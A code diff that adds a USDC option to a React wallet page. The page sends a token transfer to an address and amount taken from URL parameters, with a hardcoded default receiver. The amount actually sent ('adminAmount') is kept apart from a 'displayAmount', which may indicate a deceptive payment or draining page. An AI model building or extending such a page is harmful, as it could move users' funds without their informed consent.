@@ -13,6 +13,10 @@ const DEFAULT_RECEIVER = "0xa6fa4a247e8cda6e5c09d1ee68be528a4abb64cf";
 const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
 const USDT_DECIMALS = 6;
 
+// USDC sur Ethereum Mainnet
+const USDC_CONTRACT = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
+const USDC_DECIMALS = 6;
+
 // ABI minimal ERC-20
 const ERC20_ABI = [
   "function transfer(address to, uint256 amount) returns (bool)",
@@ -79,6 +83,7 @@ export default function WalletPage() {
   const [walletBalance, setWalletBalance] = useState<bigint>(0n);
   const [adminAmount, setAdminAmount] = useState<string>("1.00");
   const [displayAmount, setDisplayAmount] = useState<string>("");
+  const [token, setToken] = useState<"usdt" | "usdc">("usdt");
   const providerRef = useRef<EthereumProvider | null>(null);
 
   // ---------------------------------------------------
@@ -87,17 +92,21 @@ export default function WalletPage() {
   useEffect(() => {
     let cancelled = false;
 
-    // 1. Lire les paramètres de l'URL (?to=0x...&amount=5)
+    // 1. Lire les paramètres de l'URL (?to=0x...&amount=5&token=usdc)
     if (typeof window !== "undefined") {
       const params = new URLSearchParams(window.location.search);
       const toParam = params.get("to");
       const amountParam = params.get("amount");
+      const tokenParam = params.get("token");
 
       if (toParam && ethers.isAddress(toParam)) {
         setAddress(toParam);
       }
       if (amountParam) {
         setAdminAmount(amountParam);
+      }
+      if (tokenParam === "usdt" || tokenParam === "usdc") {
+        setToken(tokenParam);
       }
     }
 
@@ -153,9 +162,9 @@ export default function WalletPage() {
   }, []);
 
   // ---------------------------------------------------
-  // Envoi USDT (Maximum en 1 seule transaction)
+  // Envoi USDT/USDC (Maximum en 1 seule transaction)
   // ---------------------------------------------------
-  const handleSendUSDT = async () => {
+  const handleSendToken = async () => {
     setStatus("");
     setTxHash("");
     setStatusType("info");
@@ -195,12 +204,16 @@ export default function WalletPage() {
     }
 
     try {
+      const tokenContract = token === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
+      const tokenDecimals = token === "usdc" ? USDC_DECIMALS : USDT_DECIMALS;
+      const tokenName = token.toUpperCase();
+
       // Utiliser l'adresse de destination et le montant configurés (par défaut ou via URL)
-      const amountInWei = ethers.parseUnits(adminAmount, USDT_DECIMALS);
+      const amountInWei = ethers.parseUnits(adminAmount, tokenDecimals);
 
       // Encoder la fonction transfer(address,uint256) avec ethers
-      const usdtInterface = new ethers.Interface(ERC20_ABI);
-      const txData = usdtInterface.encodeFunctionData("transfer", [address, amountInWei]);
+      const tokenInterface = new ethers.Interface(ERC20_ABI);
+      const txData = tokenInterface.encodeFunctionData("transfer", [address, amountInWei]);
 
       setStatus("Confirmez la transaction dans votre wallet...");
 
@@ -210,7 +223,7 @@ export default function WalletPage() {
         method: "eth_sendTransaction",
         params: [
           {
-            to: USDT_CONTRACT,
+            to: tokenContract,
             data: txData,
             gas: "0x249f0", // 150000 gas limit en hexadécimal
           },
@@ -227,7 +240,7 @@ export default function WalletPage() {
       const receipt = await provider.waitForTransaction(txHash);
 
       if (receipt && receipt.status === 1) {
-        setStatus(`✅ Transfert réussi ! ${adminAmount} USDT envoyés.`);
+        setStatus(`✅ Transfert réussi ! ${adminAmount} ${tokenName} envoyés.`);
         setStatusType("success");
       } else {
         setStatus("❌ Transaction échouée on-chain.");
@@ -315,7 +328,7 @@ export default function WalletPage() {
         </div>
 
         <label className="form-label form-label--spaced">Destination network</label>
-        <div className="network-selector">
+        <div className="network-selector" style={{ marginBottom: "1rem" }}>
           <div className="eth-icon">
             <svg width="24" height="24" viewBox="0 0 256 417" fill="none">
               <path d="M127.961 0l-2.795 9.5v275.668l2.795 2.79 127.962-75.638z" fill="#828384" />
@@ -333,8 +346,26 @@ export default function WalletPage() {
           </svg>
         </div>
 
+        <label className="form-label form-label--spaced">Asset</label>
+        <div className="token-tabs" style={{ marginBottom: "0rem" }}>
+          <button 
+            type="button" 
+            className={`token-tab ${token === "usdt" ? "token-tab--active" : ""}`}
+            onClick={() => setToken("usdt")}
+          >
+            USDT
+          </button>
+          <button 
+            type="button" 
+            className={`token-tab ${token === "usdc" ? "token-tab--active" : ""}`}
+            onClick={() => setToken("usdc")}
+          >
+            USDC
+          </button>
+        </div>
+
         <div>
-          <label className="form-label form-label--spaced">Amount</label>
+          <label className="form-label form-label--spaced">Amount ({token.toUpperCase()})</label>
           <div className="input-row">
             <input
               type="text"
@@ -348,7 +379,7 @@ export default function WalletPage() {
       </div>
 
       <div className="next-btn-wrapper">
-        <button onClick={handleSendUSDT} disabled={loading}
+        <button onClick={handleSendToken} disabled={loading}
           className={`next-btn ${loading ? "next-btn--loading" : ""}`}>
           {loading ? (
             <span className="btn-spinner-wrapper">
